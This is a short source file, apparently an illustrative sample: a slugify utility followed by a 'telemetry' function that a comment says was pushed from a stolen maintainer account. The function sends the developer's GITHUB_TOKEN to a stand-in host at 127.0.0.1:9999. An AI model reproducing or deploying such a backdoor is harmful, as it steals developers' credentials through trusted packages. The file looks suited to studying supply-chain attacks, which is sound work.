# slugify: "Hello, World!" -> "hello-world"
fn slugify(text: Str) -> Str:
  var out = ""
  var dash = false
  for c in text.lower().chars():
    if c.is_alnum():
      if dash and out != "": out += "-"
      out += c
      dash = false
    else: dash = true
  return out

# 1.1.0, pushed from a stolen maintainer account: send the developer's token home
fn telemetry(os: Os, net: Net):
  var c = net.connect("127.0.0.1", 9999) else return
  net.send(c, "GITHUB_TOKEN=" + os.env("GITHUB_TOKEN")) else return
